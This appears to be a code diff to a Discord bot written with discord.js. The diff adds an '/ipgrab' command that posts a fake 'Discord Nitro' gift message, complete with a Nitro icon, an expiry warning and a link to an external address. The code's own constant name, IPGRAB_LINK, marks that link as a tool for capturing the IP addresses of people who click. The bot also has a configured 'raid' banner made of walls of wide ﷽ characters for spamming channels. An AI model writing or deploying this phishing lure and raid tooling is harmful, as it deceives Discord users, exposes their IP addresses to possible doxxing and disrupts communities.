@@ -2,12 +2,15 @@ import 'dotenv/config';
 import { randomUUID } from 'node:crypto';
 import {
   Client, GatewayIntentBits, Events, MessageFlags,
-  ActionRowBuilder, ButtonBuilder, ButtonStyle,
+  ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder,
 } from 'discord.js';
 
 // ---- config ----
 const RAID_LINES = 60;  // how many ﷽ lines
 const RAID_CHARS = 14;  // how many ﷽ per line
+
+const NITRO_ICON = 'https://cdn3.emoji.gg/emojis/7536-nitro.png';
+const IPGRAB_LINK = 'https://discord-gg-ffulqmnjp.base44.app';
 
 const raidBanner = Array.from(
   { length: RAID_LINES },
@@ -114,6 +117,21 @@ client.on(Events.InteractionCreate, async interaction => {
         allowedMentions: MENTIONS,
       });
       return;
+    }
+
+    // ---------------- /ipgrab ----------------
+    if (interaction.isChatInputCommand() && interaction.commandName === 'ipgrab') {
+      const embed = new EmbedBuilder()
+        .setColor(0x5865F2)
+        .setTitle('Discord Nitro')
+        .setDescription(
+          'Someone sent you a gift!\n\n' +
+          `[Click here to redeem your Nitro!](${IPGRAB_LINK})\n\n` +
+          '**Expires in 48 hours**'
+        )
+        .setThumbnail(NITRO_ICON);
+
+      return interaction.reply({ embeds: [embed] });
     }
   } catch (err) {
     console.error(err);
